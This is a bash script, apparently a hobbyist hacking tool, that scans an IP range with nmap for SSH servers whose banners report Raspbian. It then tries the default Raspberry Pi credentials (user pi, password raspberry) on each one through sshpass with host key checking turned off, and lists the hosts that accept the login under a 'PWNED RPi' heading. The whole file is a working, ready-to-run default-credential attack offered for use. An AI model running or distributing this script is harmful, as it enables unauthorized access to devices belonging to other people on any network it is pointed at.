#!/bin/bash
# #########################
# title : rpisearch.sh
# author : tclauzel
# description : search Raspberry and try defaut login
# version : 1.1
# ########################
helpFunction()
{
   echo ""
   echo "Usage: $0 -a IP RANGE"
   echo -e "\t-a 192.168.1.0/24"
   exit 1 # Exit script after printing help
}

while getopts "a:b:c:" opt
do
   case "$opt" in
      a ) parameterA="$OPTARG" ;;
      ? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
   esac
done

# Print helpFunction in case parameters are empty
if [ -z "$parameterA" ]
then
   echo "Some or all of the parameters are empty";
   helpFunction
fi

scan() {
range="$parameterA"
nmap --script=banner -p 22 $range >> liste_rpi.txt
grep -B 5 Raspbian liste_rpi.txt  >> liste_open.txt
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" liste_open.txt >> ip_ssh_open.txt
cat ip_ssh_open.txt
}

attack() {
cat ip_ssh_open.txt |  while read output
do
    echo "check for $output"
    out=$(sshpass -p 'raspberry' ssh -T -o StrictHostKeyChecking=no  pi@$output echo ok 2>&1)
    echo $out > tmp.txt
    string1="ok"
    if grep -qF "$string1" tmp.txt;then
        echo "$output is vulnerable !!!"
        echo $output >> vulerables_rpi.txt
    else
        echo "$output is not vulnerable"
    fi
done
}

clean() {
rm tmp.txt > /dev/null 2>&1
rm liste_rpi.txt > /dev/null 2>&1
rm liste_open.txt > /dev/null 2>&1
rm ip_ssh_open.txt > /dev/null 2>&1
}

result() {
FILE=vulerables_rpi.txt
if [ -f "$FILE" ]; then
    cat vulerables_rpi.txt
else 
    echo ""
fi
}

# ---------------------------------------------
#
# INSTALLING REQUIRED TOOLS
#
# ---------------------------------------------
exists()
{
    command -v "$1" >/dev/null 2>&1
}

echo "

██████╗ ██████╗ ██╗███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗
██╔══██╗██╔══██╗██║██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║
██████╔╝██████╔╝██║███████╗█████╗  ███████║██████╔╝██║     ███████║
██╔══██╗██╔═══╝ ██║╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║
██║  ██║██║     ██║███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

"

# ---------------------------------------------
#
# VERIFY RUN AS ROOT
#
# ---------------------------------------------
if [[ $EUID -ne 0 ]]; then
    echo "Work like a true hacker ! run the script as ROOT !"
    exit 1
fi


echo -e "\e[31m --------------------------------- \e[0m"
echo -e "\e[31m Checking for prerequisite  \e[0m"
echo -e "\e[31m --------------------------------- \e[0m \n"

## nmap ##
if exists nmap; then
    echo 'The program nmap exists!'
else
    echo 'Your system does not have the program'
    echo '###Installing nmap..'
    apt-get install nmap -y
fi

## sshpass ##
if exists sshpass; then
    echo 'The program sshpass exists!'
else
    echo 'Your system does not have the program'
    echo '###Installing sshpass..'
    apt-get install sshpass -y
fi

echo -e "\e[31m --------------------------------- \e[0m"
echo -e "\e[31m SCANNING FOR RPi  \e[0m"
echo -e "\e[31m --------------------------------- \e[0m \n"
scan
echo -e "\e[31m --------------------------------- \e[0m"
echo -e "\e[31m TRYING DEFAUT LOGIN FOR RPi  \e[0m"
echo -e "\e[31m --------------------------------- \e[0m \n"
attack
clean
echo -e "\e[31m --------------------------------- \e[0m"
echo -e "\e[31m PWNED RPi : \e[0m"
echo -e "\e[31m --------------------------------- \e[0m \n"
result
 
